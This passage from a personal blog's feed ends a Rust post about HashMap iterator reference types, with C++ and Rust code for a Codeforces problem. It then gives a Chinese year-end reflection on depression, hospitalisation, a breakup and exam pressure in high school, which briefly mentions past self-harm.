HashMap 的文档，发现 <code>.iter()</code> 的返回值类型是<code>Iter&lt;K, V&gt;</code> 而 <code>Iter</code> 中有一个<code>Item</code> 是 <code>(&amp;K, &amp;V)</code> ， 那么也就破案了HashMap 迭代器的类型</p><p>但回到最初的问题发现还是对不上，为什么 key 是对引用的引用？</p><p>仔细思考发现这里我忽略了闭包里的值本身就是对迭代器的引用。所以最前面那个对二元组的引用其实是闭包里出现的对迭代器的引用，但是迭代器本身又是对元素（包含两个引用的二元组）的引用，所以这里是对引用的引用。模式匹配后key 继承了这两层引用：一层是对迭代器的，一层是迭代器对元素的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做 Codeforces Educational Round 169 D Colored Portals 时，需要找到
i 前面距离 i 最近的颜色不完全相同但也不完全不同的 j，我随手写了个&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; vector&amp;lt;string&amp;gt; type = &amp;#123;&lt;span class=&quot;string&quot;&gt;&amp;quot;BG&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;BR&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;BY&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;GR&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;GY&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;RY&amp;quot;&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;map&amp;lt;string, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt; m;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt; &lt;span class=&quot;title&quot;&gt;lc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(n, &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(n, &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; condi = m | &lt;span class=&quot;built_in&quot;&gt;filter&lt;/span&gt;([&amp;amp;](&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; &amp;amp;p) &amp;#123; &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; p.first != in[i] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;has_same&lt;/span&gt;(p.first, in[i]); &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; lci = ranges::&lt;span class=&quot;built_in&quot;&gt;max_element&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                condi, [](&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; &amp;amp;a, &lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; &amp;amp;b) &amp;#123; &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a.second &amp;lt; b.second; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lci != ranges::&lt;span class=&quot;built_in&quot;&gt;end&lt;/span&gt;(condi)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lc[i] = lci-&amp;gt;second;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    m[in[i]] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后吐槽了下 C++ 没有 &lt;code&gt;.iter().filter()&lt;/code&gt; 或者
&lt;code&gt;.iter().map()&lt;/code&gt; 这种写法&lt;/p&gt;
&lt;p&gt;于是我就建了个 D.rs 写了个 Rust 版本的:&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;use&lt;/span&gt; std::collections::HashMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;has_same&lt;/span&gt;(a: &amp;amp;[&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;], b: &amp;amp;[&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]) &lt;span class=&quot;punctuation&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (a[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] == b[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] || a[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] == b[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) || (a[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] == b[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] || a[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] == b[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;main&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;n&lt;/span&gt; : &lt;span class=&quot;type&quot;&gt;usize&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;inv&lt;/span&gt; : &lt;span class=&quot;type&quot;&gt;Vec&lt;/span&gt;&amp;lt;[&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]&amp;gt; = &lt;span class=&quot;built_in&quot;&gt;vec!&lt;/span&gt;[[&lt;span class=&quot;string&quot;&gt;&amp;#x27;B&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;], [&lt;span class=&quot;string&quot;&gt;&amp;#x27;B&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;], [&lt;span class=&quot;string&quot;&gt;&amp;#x27;G&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;Y&amp;#x27;&lt;/span&gt;], [&lt;span class=&quot;string&quot;&gt;&amp;#x27;G&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;R&amp;#x27;&lt;/span&gt;]]; &lt;span class=&quot;comment&quot;&gt;// simple&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;mut &lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;map&lt;/span&gt; : HashMap&amp;lt;[&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;], &lt;span class=&quot;type&quot;&gt;i32&lt;/span&gt;&amp;gt; = HashMap::&lt;span class=&quot;title function_ invoke__&quot;&gt;new&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;mut &lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;lc&lt;/span&gt; = &lt;span class=&quot;built_in&quot;&gt;vec!&lt;/span&gt;[-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; n];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0usize&lt;/span&gt;..n &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;Some&lt;/span&gt;(lci) = map.&lt;span class=&quot;title function_ invoke__&quot;&gt;iter&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            .&lt;span class=&quot;title function_ invoke__&quot;&gt;filter&lt;/span&gt;(|(key, _)| *key != &amp;amp;inv[i] &amp;amp;&amp;amp; &lt;span class=&quot;title function_ invoke__&quot;&gt;has_same&lt;/span&gt;(key, &amp;amp;inv[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            .&lt;span class=&quot;title function_ invoke__&quot;&gt;max_by&lt;/span&gt;(|a, b| a.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;title function_ invoke__&quot;&gt;cmp&lt;/span&gt;(&amp;amp;b.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lc[i] = *lci.&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        map.&lt;span class=&quot;title function_ invoke__&quot;&gt;insert&lt;/span&gt;(inv[i].&lt;span class=&quot;title function_ invoke__&quot;&gt;clone&lt;/span&gt;(), i &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;i32&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;println!&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;#123;:?&amp;#125;&amp;quot;&lt;/span&gt;, lc);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="问题解决" scheme="https://amiriox.github.io/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
    <category term="Rust" scheme="https://amiriox.github.io/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>永远不要放弃战斗 -- 三年年终总结</title>
    <link href="https://amiriox.github.io/2025/01/26/2022-2023-2024/"/>
    <id>https://amiriox.github.io/2025/01/26/2022-2023-2024/</id>
    <published>2025-01-26T14:24:33.000Z</published>
    <updated>2025-02-20T14:02:13.282Z</updated>
    
    <content type="html"><![CDATA[<p>生命不是惋惜或哀悼，也不是仰慕和歌颂。</p><p>生命是一种力，无所不用其极地把活着与死亡区分开来的力，就像人们竭力把节日和平常区分开来一样——尽管其中并无区别。</p><p>从这个角度来看，求生欲就是生命本身，生命就是一座墓碑。</p><p>墓碑见过吗？在人的坟墓前立一块石头，镌刻上逝者生前的功绩，或者琐事。</p><p>其实我们完全没必要这样做的，但是我们还是做了，这就是人类文明。</p><hr /><blockquote><p>由于之前写的有点难过, 所以延续 2020 年 和 2021 年的传统,还是写收获和缺陷, 尽量避免表达感情</p><p>依照传统还应该写一些主要的经历什么的,但我仍然没有做好面对这些痛苦经历的准备,不知道是我自己脆弱了还是我面对的困境更加致命了。</p><p>我以为这篇总结会很容易写, 但我发现自己已经无力面对过去了。但我不想让那些罪就白遭了, 更不想遗忘那些挣扎的瞬间,把本就孤独的自己抛弃遗留在那些难以忍受的过去。</p><p>我想给过去的自己一份交代啊。</p></blockquote><h2 id="part-i.-高中概述">Part I. 高中概述</h2><p>我的高中过得非常压抑。</p><p>也许一开始只是很普通的大家都会遇到的事情, 因为成绩焦虑, 被老师针对,人际交往上的问题。 或许每个人都或多或少经历过这些,我不知道为什么到我这里就成了无法愈合的伤口。我耗费了大量的精力去鼓足勇气克服困难:为了不被这些普通的痛苦耗尽力气, 重新调整计划,去想各种找回自己的方案。</p><p>难以合流的孤独, 对未来不确定的焦虑,内心的话语无法与人诉说。算法竞赛成了我的唯一精神支柱。但也许从那时候开始这个家也从来没有接纳过我。仍然是大量的负反馈,白天在令人难以忍受的学校隐藏自己,晚上希望在方寸屏幕间重新锚定自己的存在,但持续的负反馈只是继续在已经破碎的意志上施加痛苦。</p><blockquote><p>我也曾 隐约想过 从这世界逃离<br />因为如影随形的空虚 将我攥紧<br />曾窥见零光片羽 遂毕生追逐代替<br />又该怎样劝解 挑剔色彩的眼睛</p></blockquote><p>我不知道如何做, 只是每天数着高考倒计时, 然后学习, 保持冲锋的姿态,然后用这种姿态来掩盖和压抑内心的复杂情绪。</p><p>在高三来临以前, 我一直处在一个循环中:因文化课和算法竞赛的双重压力而不得不断尾求生,但每次下定决心退役后又发现精神状态反而更差了,所以只能一面忍受着两倍的负反馈和压力, 一边还要批判自己。</p><p>然后高三就来了。<br />每一年都会有一届高三,但无人关心某个具体的人在这时代洪流下的具体心情。<br />那天出了高考考场后, 看着夕阳在自己身后描画出我的影子,冷淡地看着周围与我无关的鲜花和礼炮。<br />我只知道无论那一学年的开始有多么遭,当时的自己也绝不会想到会是这样的结果。</p><p>苦难并非从一开始就如影随形。</p><p>就像所有人一样, 比高一高二更努力地学习, 下晚自习继续去自习室。<br />表白也成功了, 就好像我的高三终于一扫之前的瘴气,仿佛终于要开始有了生机:<br />有了”受折磨的高中就要结束了”、“我以后不会再孤独了”这样的信念,一切行动都愈发坚定了。</p><p>然后就分手了, 转瞬即逝。</p><p>分手后的情感隔离倒反而帮助我能更专心学习了,分手之后的那段时间其实反而学习的效率更高了。<br />然而祸不单行,这个时候父亲和母亲也在这个关键的时间点开始对我各种折磨。</p><p>我实在无法想象高考前那时候的自己: 发着烧被母亲拽下床,但仍然还对未来抱有希望, 充满了革命乐观主义,幼稚但令人羡慕地认为这样的生活有尽头。(这也是我很难面对过去但也要坚持写完这篇总结的原因)</p><p>与此同时, 在学校的日子也越发难过了, 现实里唯一的朋友也转班走了,真的到了有时候一天里除了早读嗓子都不发出声音,偶尔一咳嗽发现嗓子都堵住了的感觉。</p><p>没有亲身体会过的人是不会知道高三陷入这种状态的危险性的: 早上,或者中午, 走在上学的路上, 感觉自己和世界严重的割裂感,就像有一层屏障隔离开,想要观测这个世界就愈发觉得自己不存在。干什么都浑浑噩噩,更别提学习的动力了。</p><p>即便如此我也抱着希望。考虑到学校的节奏已经跟不太上了(我 2021年的总结里就有提到自己后悔来实验班),于是决定住院。一是觉得自己的分析对改变现状没什么作用, 只能求助现代医学;二来也是希望到一个不被带节奏的环境自己学。</p><p>那几个月可能是治疗确实有用, 也可能是因为遇到了自己的心选姐,觉得自己又能有一个家了的原因,学习状态和精神状态都非常好。我们在医院走廊的地铺上对对方表白、互诉爱意。</p><p>当然后来回去了,一度被甩到身后的那些必须要面对的困境又追上来了。<br />因为药的原因睡眠时间很多, 家里的问题也仍然没有什么改善(这一段展开写了很多还是删了, 无力面对)</p><p>但这段时间因为有她在,精神状态还是一直及格。但问题和紧张的情绪是一直在累计的。</p><p>我还记得有一天, 她送我的羽毛丢了, 碰巧那天她也对我比较冷淡,加上高考倒计时的逼近, 让我实在有些焦虑, 虽然后面这件事是解决了,但是高三的压力是切实压在我身上继续生效的。</p><p>这份压力最终还是最终导致了分手。显而易见地,那个时候根本承受不住日益增强的压力和分手的悲痛。</p><p>我停课了。</p><p>停课在家的这几个月是极度黑暗的时间,当时已经在想复读了(这意味着这高三还得再经历一遍),当时看了青猪新TV化的那一部, 去学校感受到极度压力的那一段真是感同身受,当时两个月之间需要再续假必须要我本人回学校,当时真的是小心翼翼躲着人走。</p><p>当时对复读的心态其实很好理解, 一是逃避当下的压力,况且还有分手之后的撕心裂肺的痛苦在(这感觉直到现在快过去一年了有时候还是会袭上心头),二是过去几乎做什么都在失败,我确确实实有一点想杀死自己的感觉了(尤其是当时自残越来越高的阈值,开始拿打火机火苗外焰烫自己), 但我其实想的一直都不是死, 而是重生,我实在无法接受这样失败的自己了: 而当下最契合”重生”概念的就是复读了。</p><p>不过我仍然试图让当下的生活更有意义, 起码不要让自己那么浑浑噩噩,我试图捡回算法竞赛,甚至买来数位板打算学习画画。但是那时候的无力感和绝望并没能被扭转。</p><p>然后自然高考寄了。但出分之后发现起码能卡在自己能接受的最低程度,考虑到自己的精神状态也不敢再挺一年了, 于是还是走了。</p><p>因为各种精神压力, 高中自然是没什么(文化课以外的)技术收获。</p><h2 id="part-ii.-大学半年">Part II. 大学半年</h2><p>// TODO</p><p>进了个 RISC-V 架构操作系统课的秋令营, 第一个阶段是<code>Rustlings</code>,还记得那段时间最长一天写了十多个小时代码(<code>wakatime</code> 统计,这个是不统计挂机时间的), 但第二阶段</p><p>竞赛碰壁居多,最近也在考虑退役竞赛的事情(毕竟这部分已经对我利大于弊了,而且计算机其实还有很多好玩的领域可以学),不过写完高中总结已经很耗费精力了, 只能说大学其实也没什么好事发生,我暂时没有更多精神再写大学的糟糕事情了,先放在这等以后哪天有状态再写吧。</p><hr /><p>以下是旧的总结</p><hr /><h2 id="新生">新生 ?</h2><p>继上一篇年终总结以来已经整三年了，包括两年半的高中和半年的大学生活。我还是难以置信自己从高中的生活力走出来了：如果我能回头，我一定能能看到当年数着倒计时的自己向我投来难以置信的目光。倘若我们之间还有张若隐若现的幕布，并且只有隐约的声音能传达给对方，想必会更有意思的。请原谅我，我并非有意折磨过去的自己，毕竟那个时候的我对大学一定是充满希望的，未知阻挡不了他的脚步。</p><p>我们说到哪来着？精神状态异常的高一新生？如果我足够懒惰，这篇文章只要把高一改成大一就可以结束了。遗憾的是，我并不懒惰，现在的生活也并非新生。</p><h2 id="高一">高一</h2><p>我实在不记得什么了。</p><h2 id="高二">高二</h2><p>绝境中的我还是爆发出了求生的勇气，尽管我现在也分不清这是勇敢还是鲁莽，还是某种恶俗的隐喻或者自欺欺人的cosplay——这评价可太对了。总之，我请了一个晚自习的长假，然后跑去自习室学算竞之类的，当然后期不搞OI 了也是在自习室学文化课。在一个没有校队的县城自学往往没什么学 OI的氛围感也很难有 OIer的身份认同和社会关系——即便是现在也不知道取得这样平淡成绩的自己能否算OIer, 况且还是在那时认识的朋友现在基本都不联系了的情况下。我的 OI生涯就像某种 cosplay,似乎就是在追寻一种离奇的代入感。现在的我时常感叹于初中的自己在 OIer里扎了跟、找到了家，到了高中就有些自以为坚定地迷茫了。</p><p>我实在不记得什么了。</p><h2 id="高三">高三</h2><p>这倒是丰富多彩，只是我自己也区分不出褒义或贬义。</p><p>在班上的人际关系矛盾日益明显，内心的慌乱日益增长。</p><p>我和我当时最好的朋友表白了，我们在一起了，然后分手了。时至今日依旧觉得像一场梦，我逃避般地前往另一座城市，又跌跌撞撞地回来。现在想起来，我们很难被称作是相似的人。天台、远方、双盲诗，一定是两位的高三都过得不太好，对吧？</p><p>当时的我倒展现了难以置信的所谓抗逆性，回家的几天后就回了学校，然后机械地做题。当然，后面一段时间反而是没了什么血性，晚上翘掉晚自习去唱歌，有些浑浑噩噩了。</p><p>在学校的生活日益紧张，现实里唯一的朋友转了班，这教室真是越来越令人窒息了。我不想多谈，实际上也不记得什么了，只记得觉得自己不能这样下去了，就去住院了。我实际上是抱着在里面冷静下来——逃离了班级——然后好好自学，等缓得还不错了再出来，然而后面的事情却完全出乎了我的意料，我更倾向于说这是褒义。</p><p>第一次见到她时我的行为令我自己都感到惊讶，但我不想谈也不记得什么了（这是可悲的），总之在学校已经忘了人话是怎么说的我居然和她交谈上了。我在当时的日记里写满了不要追她，但我也只有那时候写了日记。</p><p>我记得我们一起哭、一起笑，还记得她的生日，我的礼物，照片与相册、海藻球和手作。我记得我们谈理想，你说你选择教育的出发点是为了弥补家长对孩子带来的伤害。</p><p>我记得我的耳机连到了她的蓝牙，我记得她难受的时候我的心也跟着阵痛。</p><p>好想和你在一起啊，如果我真的能给你带来些什么的话。</p><blockquote><p>🎵 春天是她最爱的季节 🎵</p><p>我对她唱着，一边问她：是吗？</p><p>她说，可以是。</p></blockquote><p>我们戴着一双耳机，听 Taylor Swift 的 You Belong With Me.</p><p>我记得那天昏暗的走廊上，她对我“为什么不可以呢？你不也会长大吗？”。恰如其分关闭的灯光掩盖了我的脸红，爱意淹没在人们的安眠中。两只手就那样牵到了一起，我感受着她的疲倦、她的勇气，她压低的声音和她握着我的手的触感，单调青涩地表达着我的心意——如果我真的有表达到了的话。</p><p>我们戴着一双耳机，听陶喆的蝴蝶。</p><p>她为我做了一只点翠工艺的戒指。其实那天她没能做成功，但是后来又努力做了出来给我。我给她缝了一只手包，其实那天是我第一次拿起一根针。</p><p>后面还有很多事，这里就不一一展开了。我并不会像枯野瑛那样，残忍地在一个悲剧结局前作过多的美好铺垫，但是命运会。</p><p>那天你睡着了我看了你好久，想着我们永远不要分开。</p><p>那天你睡着了我看了你好久，我知道我们早晚要分开的。</p><p>可你还是“把该说的都说完了”，可你还是说“未来的路还有很长，希望你可以越来越好吧“。我不愿再回忆那个难眠的夜晚，<em>幸运</em>的是也没什么溶质需要溶于人们的安眠中了。</p><p><ahref="https://www.luogu.com/article/618z01yx">「僕らは約束した」《我心中危险的东西》带给我的</a></p><p>这一段的文字比文章开头的概述尔尔加起来还多，但我并不后悔在这件事上花费更多的篇幅，多少也不后悔。</p><p>只是前些日子又想起来你。你的离开是明智的，比翼鸟只是不可及的传说，我们治愈对方的同时也在伤害对方。是我一开始就不应该上前去，我玷污了你的人生。</p><p>可是我还是很想你啊。</p><p>我实在不记得什么了。我没能展现出多少抗逆性，我回家，狠狠地放了市二模省三模的鸽子，不分昼夜，庸庸碌碌地混日子。我也不是没有反抗过，我试图写Minecraft 的 Mod, 我买来数位板试图画画,统统被笼罩在我房间里的忧伤以及对高考的恐惧扼杀。</p><p>考前一周多的时候，母亲说我这辈子也就这样了。</p><p>我想要是你还在该多好啊。</p><p>我实在不记得什么了。我实在不记得什么了。我不想忘记。</p><h2 id="新生-1">新生 ?</h2><p>前往大学的途中父亲失误把行李箱砸在别人身上了。下榻在一间简陋的旅馆，我的大学生活就这样开始了。我多少年来梦想着我会用多么精彩的文笔和宏大的篇幅描述我的高考假期。刚认识她天，她说高考假期真的可以好好利用。后来，她也陪伴着准备高考的我，是我那个挣扎的困境中强有力的支柱。</p><blockquote><p>所以要开开心心地结束高考哦</p><p>到时候找个小城租个民宿</p><p>我们可以一起呆很久</p></blockquote><p>只可惜天生傲骨的我没能玩过那两张卷子，也再也看不清艳阳天；不出意外的话，也再看不到她对我笑了。(这几段其实取自谁的一篇作文，我记不清了。)</p><p>这半年的生活，没有什么好写的。</p><p>我不记得那些流泪的夜晚，阳光帮我模糊了它们。我的心其实有一种不切实际也无疾而终的幻想，追求着的梦境里：血肉安然封闭在皮肤下，阳光中的红外线温暖着皮肤上的感受器，被拥抱着的自由神经末梢取悦伏隔核与前额叶，身体像一整章和谐的诗篇。</p><p>但是现在只有冬天。脚下踩的是冬天，敲击脸颊的是冬天，激烈的言语和无谓的挣扎也一样是冬天。我“努力把生活过好”的激情和热量一起被带走了。我不死心：</p><blockquote><p>只要我的生命一息尚余，夏天就会永远延续。</p></blockquote><p>为此，我把曾经视为生命的算法竞赛强行降权，可又不知道又有什么是值得热爱的。我思来想去，终于看见了自己的孤独。我喜欢的只有算法，没有竞赛。</p><p>我实在不记得什么了。</p><hr /><p><strong>さよなら</strong><br /><strong>再见了</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;生命不是惋惜或哀悼，也不是仰慕和歌颂。&lt;/p&gt;
